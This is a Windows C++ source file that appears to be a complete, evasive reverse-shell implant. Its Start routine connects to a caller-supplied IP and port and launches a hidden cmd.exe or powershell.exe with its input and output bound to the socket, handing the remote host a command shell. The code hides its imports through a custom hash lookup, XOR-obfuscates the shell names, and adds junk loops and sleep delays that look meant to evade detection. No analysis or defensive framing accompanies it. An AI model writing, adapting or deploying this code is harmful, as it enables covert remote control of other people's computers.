#include "header.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ws2_32.lib")

using std::string;

void empty2() {
    DWORD t1 = GetTickCount();
    LARGE_INTEGER perfCount;
    QueryPerformanceCounter(&perfCount);
}

DWORD customHash(const char* str) {
    DWORD hash = 0x35;
    while (*str) {
        hash ^= *str++;
        hash = _rotl(hash, 5);
    }
    return hash;
}

void empty3() {
    volatile int val = 1;
    for (int i = 0; i < 50000; i++) {
        val = (val * 31 + i) % 97;
    }
}

FARPROC resolveByHash(HMODULE module, DWORD hash) {
    if (!module) return nullptr;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)module + dos->e_lfanew);
    DWORD expDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expDirRVA) return nullptr;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module + expDirRVA);

    DWORD* names = (DWORD*)((BYTE*)module + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)module + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)module + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = (const char*)module + names[i];
        if (customHash(name) == hash) {
            return (FARPROC)((BYTE*)module + funcs[ords[i]]);
        }
    }
    return nullptr;
}

#define HASH_LoadLibraryA     0xc4202377
#define HASH_GetProcAddress   0xa6d6df3c
#define HASH_WSAStartup       0xC499F985
#define HASH_WSASocketA       0x01017BA3
#define HASH_connect          0x1AD3002B
#define HASH_CreateProcessW   0x6134A809
#define HASH_Sleep            0xcaf31a00

void empty1() {
    volatile int x = 0;
    for (int i = 1; i <= 100000; ++i) {
        x += (i * 3) % 7;
        x -= (i * 2) % 5;
    }
}

void Start(const string& ip, const string& port, bool useCmd) {

    empty1();

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    typedef void (WINAPI* fnSleep)(DWORD);
    fnSleep Sleep_ptr = (fnSleep)resolveByHash(hKernel32, HASH_Sleep);

    if (Sleep_ptr) {
        Sleep_ptr(15000);
    }
    else {
        Sleep(15000);
    }

    empty3();

    auto LoadLibraryA_ptr = (HMODULE(WINAPI*)(LPCSTR))resolveByHash(hKernel32, HASH_LoadLibraryA);
    auto GetProcAddress_ptr = (FARPROC(WINAPI*)(HMODULE, LPCSTR))resolveByHash(hKernel32, HASH_GetProcAddress);

    if (!LoadLibraryA_ptr || !GetProcAddress_ptr) {
        return;
    }

    empty1();

    HMODULE hWs2_32 = LoadLibraryA_ptr("ws2_32.dll");
    if (!hWs2_32) {
        return;
    }

    auto WSAStartup_ptr = (int(WINAPI*)(WORD, LPWSADATA))GetProcAddress_ptr(hWs2_32, "WSAStartup");
    auto WSASocketA_ptr = (SOCKET(WINAPI*)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD))GetProcAddress_ptr(hWs2_32, "WSASocketA");
    auto connect_ptr = (int(WINAPI*)(SOCKET, const struct sockaddr*, int))GetProcAddress_ptr(hWs2_32, "connect");

    auto CreateProcessW_ptr = (BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
        BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))resolveByHash(hKernel32, HASH_CreateProcessW);

    if (Sleep_ptr) {
        Sleep_ptr(3000);
    }
    else {
        Sleep(3000);
    }
    
    empty3();

    if (!WSAStartup_ptr || !WSASocketA_ptr || !connect_ptr || !CreateProcessW_ptr) {
        return;
    }

    WSADATA wsaData;
    if (WSAStartup_ptr(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    SOCKET s = WSASocketA_ptr(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((u_short)std::stoi(port));
    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect_ptr(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return;
    }

    wchar_t cmdBuffer[32] = { 0 };

    if (useCmd) {
        const wchar_t obfCmd[] = {
            L'c' ^ 0x12, L'm' ^ 0x12, L'd' ^ 0x12, L'.' ^ 0x12,
            L'e' ^ 0x12, L'x' ^ 0x12, L'e' ^ 0x12, 0
        };
        for (int i = 0; i < 7; ++i) {
            cmdBuffer[i] = obfCmd[i] ^ 0x12;
        }
        cmdBuffer[7] = 0;
    }
    else {
        const wchar_t obfPS[] = {
            L'p' ^ 0x33, L'o' ^ 0x33, L'w' ^ 0x33, L'e' ^ 0x33,
            L'r' ^ 0x33, L's' ^ 0x33, L'h' ^ 0x33, L'e' ^ 0x33,
            L'l' ^ 0x33, L'l' ^ 0x33, L'.' ^ 0x33, L'e' ^ 0x33,
            L'x' ^ 0x33, L'e' ^ 0x33, 0
        };
        for (int i = 0; i < 14; ++i) {
            cmdBuffer[i] = obfPS[i] ^ 0x33;
        }
        cmdBuffer[14] = 0;
    }

    if (Sleep_ptr) {
        Sleep_ptr(2000);
    }
    else {
        Sleep(2000);
    }

    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    si.wShowWindow = SW_HIDE;

    empty2();

    if (!CreateProcessW_ptr(NULL, cmdBuffer, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        closesocket(s);
        WSACleanup();
        return;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
}
